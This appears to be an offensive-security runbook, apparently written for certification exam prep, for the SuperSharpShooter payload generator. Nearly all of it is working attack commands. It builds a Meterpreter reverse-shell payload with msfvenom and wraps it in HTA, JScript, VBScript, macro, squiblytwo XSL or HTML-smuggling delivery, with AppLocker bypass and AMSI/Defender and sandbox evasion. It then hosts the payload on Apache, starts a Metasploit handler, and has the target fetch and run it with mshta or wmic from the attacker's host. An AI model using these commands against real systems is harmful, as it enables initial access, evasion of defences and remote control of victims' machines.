# SuperSharpShooter (optional) — DotNetToJScript / squiblytwo delivery

A fork of MDSec's **SharpShooter** ("Payload Generation Framework"). It wraps your
**msfvenom raw shellcode** into a self-contained delivery payload — JScript, VBScript,
HTA, VBA macro, or Excel 4.0 SLK — that runs a C# shellcode runner **in memory** via
**DotNetToJScript** (James Forshaw's technique). It can also generate **squiblytwo** XSL
stylesheets for `wmic`/`regsvr32`.

**Where it fits:** AppLocker bypass (uses Microsoft-signed interpreters like `cscript`,
`wscript`, `mshta`, `wmic`) and initial access (macro/HTA alternatives, HTML smuggling).
It is **not** a C2 or a shellcode encoder — you feed it `msfvenom -f raw` output.

---

## 1. Install (attacker, once)

```bash
git clone https://github.com/ScriptIdiot/SuperSharpShooter.git
cd SuperSharpShooter
pip3 install -r requirements.txt
python3 SuperSharpShooter.py --help      # confirm it runs
```

> ⚠️ The original MDSec SharpShooter is unmaintained; this fork fixes it for Python 3 and
> adds AMSI/Defender evasion + a polymorphic signature string. **Lab-test before exam.**

---

## 2. Generate the raw shellcode (same as RUNBOOK Section 2)

```bash
# Stageless Meterpreter (~200KB) — SuperSharpShooter loads it in-memory, size is fine
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=8888 -f raw -o /tmp/sc.bin
```

---

## 3. Pick a delivery & generate

Run these **from the SuperSharpShooter directory**. `--dotnetver 4` = modern Windows
(.NET 4.x); use `--dotnetver 2` for .NET 2.0/3.5 targets.

| You want | Command | Deliver with |
|---|---|---|
| HTA (AppLocker-safe) | `python3 SuperSharpShooter.py --stageless --dotnetver 4 --payload hta --output payload --rawscfile /tmp/sc.bin` | `mshta.exe http://<IP>/payload.hta` |
| JScript (AppLocker-safe) | `python3 SuperSharpShooter.py --stageless --dotnetver 4 --payload js --output payload --rawscfile /tmp/sc.bin` | `cscript.exe payload.js` |
| VBScript (AppLocker-safe) | `python3 SuperSharpShooter.py --stageless --dotnetver 4 --payload vbs --output payload --rawscfile /tmp/sc.bin` | `wscript.exe payload.vbs` |
| VBA macro | `python3 SuperSharpShooter.py --stageless --dotnetver 4 --payload macro --output payload --rawscfile /tmp/sc.bin` | insert into Word |
| squiblytwo (wmic/regsvr32 XSL) | `python3 SuperSharpShooter.py --stageless --dotnetver 4 --payload hta --output payload --rawscfile /tmp/sc.bin --com xslremote --awlurl http://<IP>/payload.xsl` | `wmic.exe os get /format:"http://<IP>/payload.xsl"` |
| HTML smuggling | add `--smuggle --template mcafee` | email the `.html` |

Add `--sandbox 2,3,4,5` to enable sandbox-evasion checks (CheckPlease).

> Output lands in `output/`. Run `ls output/` to see exactly what was created
> (filenames vary by `--payload` and `--smuggle`). The `--com` flag also supports
> `outlook` and `wmic` primitives — check `SuperSharpShooter.py --help` for the combos.

---

## 4. Host + handler + deliver

```bash
# host the generated file(s)
sudo systemctl start apache2
sudo cp output/payload.hta /var/www/html/

# handler — LPORT must match the msfvenom LPORT from step 2
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST <IP>; set LPORT 8888; set ExitOnSession false; exploit -j"

# deliver on the target
mshta.exe http://<IP>/payload.hta
```

---

## Panic checklist

If nothing calls back: (1) handler `LPORT` == payload `LPORT`; (2) payload arch matches
the target; (3) `ls /var/www/html/` shows the file; (4) `jobs -l` shows the handler;
(5) the target actually has the whitelisted interpreter (`cscript`/`wscript`/`mshta`).

This **complements** (not replaces) `word-macro/`, `hta-delivery/`, and `applocker/`.
Reach for SuperSharpShooter when you need **DotNetToJScript** (no PowerShell, no on-disk
EXE) or **squiblytwo** XSL — techniques the built-in loaders don't cover.
